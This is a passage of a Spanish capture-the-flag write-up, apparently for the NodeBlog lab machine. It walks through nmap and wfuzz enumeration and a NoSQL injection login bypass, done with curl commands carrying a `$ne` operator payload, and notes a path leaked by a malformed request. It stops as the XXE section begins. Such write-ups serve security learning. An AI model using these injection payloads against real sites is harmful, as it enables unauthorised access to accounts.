@@ -1,0 +1,543 @@
+I"�1<p>Tenemos un sitio web a travez del puerto 5000 con NodeJS y ExpressJS con un panel de login el cual es vulnerable a NoSQLi con el que podemos hacer Authentication Bypass, despues descubriremos un apartado para subir archivos XML el cual es vulnetable a XXE con el cual podemos leer archivos internos de la maquina, sin embargo, ocasionando un error se va a filtrar el directorio de la aplicacion, asi que usando XXE vamos leer el archivo server.js en donde descubriremos una Insecure Deserialization en node-serialize, asi que haremos un Deserialization Attack usando IIFE para conseguir RCE, para la escalada encontraremos un puerto que corresponde a MongoDB y encontraremos las credenciales de admin donde a nivel de sudoers podemos ejecutar lo que sea</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.216</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay dos puertos abiertos, 22(SSH) y 5000:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">upnp</span>
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">5000</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">8.2</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">3072</span> <span class="n">ea</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">21</span><span class="ss">:a3</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">4</span><span class="n">a</span><span class="p">:</span><span class="mi">7</span><span class="n">d</span><span class="ss">:f9:b5</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">79</span><span class="p">:</span><span class="mi">83</span><span class="ss">:a4:f5:f2</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">b8</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">:f4</span><span class="p">:</span><span class="mi">88</span><span class="ss">:be:aa</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">2</span><span class="n">d</span><span class="p">:</span><span class="mi">10</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">7</span><span class="n">f</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">61</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">22</span><span class="p">:</span><span class="mi">21</span><span class="ss">:e9:f4</span><span class="p">:</span><span class="mi">85</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span><span class="p">:</span><span class="mi">73</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">41</span><span class="ss">:ee</span><span class="p">:</span><span class="mi">3</span><span class="n">b</span><span class="p">:</span><span class="mi">32</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">5000</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Node</span><span class="p">.</span><span class="nf">js</span> <span class="p">(</span><span class="no">Express</span> <span class="n">middleware</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Blog</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+</code></pre></div></div>
+
+<p>Con el puerto 22 no podemos hacer nada interesante mas que estamos contra un Ubuntu, ademas de que no tenemos credenciales, pero por el puerto <strong>5000</strong> tenemos que hay un servidor web que esta usando NodeJS del lado del servidor y ExpressJS como <a href="https://expressjs.com/es/guide/using-middleware.html">middleware</a></p>
+
+<p>Si realizamos fuzzing de directorios con fuerza bruta mediante wfuzz lo unico que encontraremos es que hay una ruta que corresponde a <strong>/login</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://10.10.11.139:5000/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">40</span>
+<span class="mo">000000053</span><span class="p">:</span>   <span class="mi">200</span>        <span class="mi">27</span> <span class="no">L</span>     <span class="mi">59</span> <span class="no">W</span>       <span class="mi">1002</span> <span class="no">Ch</span>     <span class="s2">"login"</span>
+</code></pre></div></div>
+
+<h3 id="explorando-el-sitio-web">Explorando el sitio web</h3>
+
+<p>Al entrar a la web tenemos como un “blog” y que tiene cierta informacion que no parace interesante</p>
+
+<p><img src="/assets/img/nodeBlog/1.png" alt="" /></p>
+
+<p>Tambien tenemos un login que descubrimos cuando hicimos fuzzing</p>
+
+<p><img src="/assets/img/nodeBlog/2.png" alt="" /></p>
+
+<p>Si probamos con credenciales random como lo puenden ser <strong>c4rta</strong> y <strong>nose</strong> nos dice que el usuario es invalido</p>
+
+<p><img src="/assets/img/nodeBlog/3.png" alt="" /></p>
+
+<p>Pero si probramos con credenciales que suelen ser por defecto, como: <strong>admin</strong> y <strong>admin</strong>, nos dice que la contraseña es invalida</p>
+
+<p><img src="/assets/img/nodeBlog/4.png" alt="" /></p>
+
+<p>Esto nos da a entender que el usuario <strong>admin</strong> es un usuario valido</p>
+
+<h2 id="nosqli-authentication-bypass">NoSQLi (Authentication Bypass)</h2>
+
+<p>Al interceptar la peticion con burp nos podemos dar cuenta de como se esta enviando nuestra peticion:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">POST</span> <span class="sr">/login HTTP/</span><span class="mf">1.1</span>
+<span class="no">Host</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span>
+<span class="no">User</span><span class="o">-</span><span class="no">Agent</span><span class="p">:</span> <span class="no">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="no">X11</span><span class="p">;</span> <span class="no">Linux</span> <span class="n">x86_64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">109.0</span><span class="p">)</span> <span class="no">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="no">Firefox</span><span class="o">/</span><span class="mf">113.0</span>
+<span class="no">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*</span><span class="sr">/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span>
+<span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">24</span>
+<span class="no">Origin</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span>
+<span class="no">Connection</span><span class="p">:</span> <span class="n">close</span>
+<span class="no">Referer</span><span class="p">:</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span>
+<span class="no">Upgrade</span><span class="o">-</span><span class="no">Insecure</span><span class="o">-</span><span class="no">Requests</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">user</span><span class="o">=</span><span class="n">c4rta</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">nose</span>
+</code></pre></div></div>
+<p>No hay mucho de destacar, podemos ver en el <strong>Content-Type</strong> que el contenido que estamos enviando es un formulario en URL encode, es una peticion POST, y demas, sin embargo, como estamos contra un login, siempre es bueno probar si existe una SQLi o NoSQLi para hacer <strong>Authentication Bypass</strong>, les puedo adelantar que mediante SQLi no se va a poder, y viendo por las tecnologias que hemos encontrado hasta ahora, es muy probable que use <strong>MEAN stack</strong>, asi que probaremos con NoSQLi</p>
+
+<blockquote>
+  <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass">PayloadsAllTheThings</a></p>
+</blockquote>
+
+<p>De primeras podemos probar con</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">user</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">password</span><span class="p">[</span><span class="vg">$ne</span><span class="p">]</span><span class="o">=</span><span class="n">mizuki</span>
+</code></pre></div></div>
+
+<p>El <strong>[$ne]</strong> significa <strong>not equal</strong>, y esta funcionando asi: Si el <strong>user</strong> es igual a <strong>admin</strong> y la <strong>password</strong> no es igual a <strong>mizuki</strong>, se estarian cumpliendo las dos condiciones por que el usuario <strong>admin</strong> si es un usuario valido y la contraseña de ese usuario no es <strong>mizuki</strong>, asi que la consulta seria verdadera y nos deberia de iniciar sesion, en mi caso usare curl:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'user=admin&amp;password[$ne]=mizuki'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="no">E</span> <span class="s2">"Content-Length|Invalid"</span>
+</code></pre></div></div>
+
+<p>Pero no funcionara:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'user=admin&amp;password[$ne]=mizuki'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="no">E</span> <span class="s2">"Content-Length|Invalid"</span>
+<span class="o">&gt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">31</span>
+<span class="o">&lt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">1040</span>
+            <span class="no">Invalid</span> <span class="no">Password</span>
+</code></pre></div></div>
+
+<p>Sin embargo podemos indicarle, que el <strong>Content-Type</strong> sea JSON para ver si ahora si funciona, simplemenete al comando le agregamos el <strong>-H</strong> para especificar que el encabezado <strong>Content-Type</strong> sea <strong>application/json</strong> y modificamos el fomato de los datos a enviar:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'{"user": "admin", "password": {"$ne": "mizuki"}}'</span> <span class="o">-</span><span class="no">H</span> <span class="s1">'Content-Type: application/json'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="no">E</span> <span class="s2">"Content-Length|Invalid"</span>
+</code></pre></div></div>
+
+<p>Y ahora dio una respuesta diferente al <code class="language-plaintext highlighter-rouge">Content-Length: 1040</code> y ya no muestra el <code class="language-plaintext highlighter-rouge">Invalid Password</code></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'{"user": "admin", "password": {"$ne": "mizuki"}}'</span> <span class="o">-</span><span class="no">H</span> <span class="s1">'Content-Type: application/json'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="no">E</span> <span class="s2">"Content-Length|Invalid"</span>
+<span class="o">&gt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">48</span>
+<span class="o">&lt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">2625</span>
+</code></pre></div></div>
+
+<p>Eso significa que funciono, en caso de que lo estes haciendo como yo, con curl, puedes modificar el comando y quitarle el grep, asi que quedaria de esta forma:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'{"user": "admin", "password": {"$ne": "mizuki"}}'</span> <span class="o">-</span><span class="no">H</span> <span class="s1">'Content-Type: application/json'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span>
+</code></pre></div></div>
+
+<p>Ahora saldra mas informacion, y en los encabezados de respuesta podras ver una cookie de sesion:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Set</span><span class="o">-</span><span class="no">Cookie</span><span class="p">:</span> <span class="n">auth</span><span class="o">=%</span><span class="mi">7</span><span class="no">B</span><span class="o">%</span><span class="mi">22</span><span class="n">user</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="no">A</span><span class="o">%</span><span class="mi">22</span><span class="n">admin</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">2</span><span class="no">C</span><span class="o">%</span><span class="mi">22</span><span class="n">sign</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="no">A</span><span class="o">%</span><span class="mf">2223e112072945418601</span><span class="n">deb47d9a6c7de8</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">7</span><span class="no">D</span><span class="p">;</span> <span class="no">Max</span><span class="o">-</span><span class="no">Age</span><span class="o">=</span><span class="mi">900</span><span class="p">;</span> <span class="no">Path</span><span class="o">=</span><span class="sr">/; Expires=Wed, 09 Aug 2023 03:24:03 GMT; HttpOnly
+</span></code></pre></div></div>
+
+<p>Asi que ahora debemos de establecer esa cookie en el navegador, puedes usar Cookie Editor o desde el mismo navegador, yo use Cookie Editor y quedo asi:</p>
+
+<p><img src="/assets/img/nodeBlog/5.png" alt="" /></p>
+
+<p>Y el recargar la pagina en la ruta <strong>/</strong> ya podremos acceder como admin evadiendo el login</p>
+
+<p><img src="/assets/img/nodeBlog/6.png" alt="" /></p>
+
+<h3 id="extra">Extra</h3>
+
+<p>Mientras probaba con curl al realizar las peticiones, hubo un momento donde se me olvido cerrar una llave en este comando:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="no">X</span> <span class="no">POST</span> <span class="o">-</span><span class="n">d</span> <span class="s1">'{"user": "admin", "password": {"$ne": "mizuki"}'</span> <span class="o">-</span><span class="no">H</span> <span class="s1">'Content-Type: application/json'</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">login</span>
+</code></pre></div></div>
+
+<p>Y eso me arrojo esto:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span>   <span class="no">Trying</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span><span class="o">...</span>
+<span class="o">*</span> <span class="no">Connected</span> <span class="n">to</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">)</span> <span class="n">port</span> <span class="mi">5000</span> <span class="p">(</span><span class="c1">#0)</span>
+<span class="o">&gt;</span> <span class="no">POST</span> <span class="sr">/login HTTP/</span><span class="mf">1.1</span>
+<span class="o">&gt;</span> <span class="no">Host</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.139</span><span class="p">:</span><span class="mi">5000</span>
+<span class="o">&gt;</span> <span class="no">User</span><span class="o">-</span><span class="no">Agent</span><span class="p">:</span> <span class="n">curl</span><span class="o">/</span><span class="mf">8.1</span><span class="o">.</span><span class="mi">1</span>
+<span class="o">&gt;</span> <span class="no">Accept</span><span class="p">:</span> <span class="o">*</span><span class="sr">/*
+&gt; Content-Type: application/</span><span class="n">json</span>
+<span class="o">&gt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">47</span>
+<span class="o">&gt;</span> 
+<span class="o">&lt;</span> <span class="no">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">400</span> <span class="no">Bad</span> <span class="no">Request</span>
+<span class="o">&lt;</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">:</span> <span class="no">Express</span>
+<span class="o">&lt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Security</span><span class="o">-</span><span class="no">Policy</span><span class="p">:</span> <span class="n">default</span><span class="o">-</span><span class="n">src</span> <span class="s1">'none'</span>
+<span class="o">&lt;</span> <span class="no">X</span><span class="o">-</span><span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="o">-</span><span class="no">Options</span><span class="p">:</span> <span class="n">nosniff</span>
+<span class="o">&lt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
+<span class="o">&lt;</span> <span class="no">Content</span><span class="o">-</span><span class="no">Length</span><span class="p">:</span> <span class="mi">849</span>
+<span class="o">&lt;</span> <span class="no">Date</span><span class="p">:</span> <span class="no">Thu</span><span class="p">,</span> <span class="mi">10</span> <span class="no">Aug</span> <span class="mi">2023</span> <span class="mo">02</span><span class="p">:</span><span class="mi">36</span><span class="p">:</span><span class="mi">34</span> <span class="no">GMT</span>
+<span class="o">&lt;</span> <span class="no">Connection</span><span class="p">:</span> <span class="n">keep</span><span class="o">-</span><span class="n">alive</span>
+<span class="o">&lt;</span> <span class="no">Keep</span><span class="o">-</span><span class="no">Alive</span><span class="p">:</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span>
+<span class="o">&lt;</span> 
+<span class="o">&lt;!</span><span class="no">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Error</span><span class="o">&lt;</span><span class="sr">/title&gt;
+&lt;/</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;</span><span class="no">SyntaxError</span><span class="p">:</span> <span class="no">Unexpected</span> <span class="k">end</span> <span class="n">of</span> <span class="no">JSON</span> <span class="n">input</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="no">JSON</span><span class="p">.</span><span class="nf">parse</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">anonymous</span><span class="o">&amp;</span><span class="n">gt</span><span class="p">;)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="n">parse</span> <span class="p">(</span><span class="sr">/opt/</span><span class="n">blog</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">body</span><span class="o">-</span><span class="n">parser</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">types</span><span class="o">/</span><span class="n">json</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">19</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="sr">/opt/</span><span class="n">blog</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">body</span><span class="o">-</span><span class="n">parser</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">read</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">121</span><span class="p">:</span><span class="mi">18</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="n">invokeCallback</span> <span class="p">(</span><span class="sr">/opt/</span><span class="n">blog</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">raw</span><span class="o">-</span><span class="n">body</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">224</span><span class="p">:</span><span class="mi">16</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="n">done</span> <span class="p">(</span><span class="sr">/opt/</span><span class="n">blog</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">raw</span><span class="o">-</span><span class="n">body</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">213</span><span class="p">:</span><span class="mi">7</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="no">IncomingMessage</span><span class="p">.</span><span class="nf">onEnd</span> <span class="p">(</span><span class="sr">/opt/</span><span class="n">blog</span><span class="o">/</span><span class="n">node_modules</span><span class="o">/</span><span class="n">raw</span><span class="o">-</span><span class="n">body</span><span class="o">/</span><span class="n">index</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">273</span><span class="p">:</span><span class="mi">7</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="no">IncomingMessage</span><span class="p">.</span><span class="nf">emit</span> <span class="p">(</span><span class="n">events</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">412</span><span class="p">:</span><span class="mi">35</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="n">endReadableNT</span> <span class="p">(</span><span class="n">internal</span><span class="o">/</span><span class="n">streams</span><span class="o">/</span><span class="n">readable</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">1334</span><span class="p">:</span><span class="mi">12</span><span class="p">)</span><span class="o">&lt;</span><span class="n">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="n">nbsp</span><span class="p">;</span><span class="n">at</span> <span class="n">processTicksAndRejections</span> <span class="p">(</span><span class="n">internal</span><span class="o">/</span><span class="n">process</span><span class="o">/</span><span class="n">task_queues</span><span class="p">.</span><span class="nf">js</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">21</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/pre&gt;
+&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="sr">/html&gt;
+* Connection #0 to host 10.10.11.139 left intact
+</span></code></pre></div></div>
+
+<p>Parece una tonteria, pero no, desde mi experiencia en CTFs, cuando a una aplicacion se le proporciona una entrada invalida va a petar, y en ocaciones mostrara informacion que puede ser de utilidad, y muchas veces esa informacion es la ruta de donde recide a aplicacion, y este caso podemos ver que es <strong>/opt/blog/</strong>, <strong>esto sera inportante mas adelante</strong></p>
+
+<h2 id="xxe-file-read">XXE (File Read)</h2>
+
+<p>Si exploramos otra vez, ahora vamos a poder subir archivos y crear nuevos posts, nos centraremos en la parte de subir archivos, si intentamos subir un archivo cualquiera, un txt por ejemplo, nos arrojara un mensaje como este:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invalid XML Example: Example DescriptionExample Markdown
+</code></pre></div></div>
+
+<p>Al paracer esta esperando un XML con una estructura, si le damos Ctrl + U para ver el codigo fuente, vamos a poder ver la estructura que espera:</p>
+
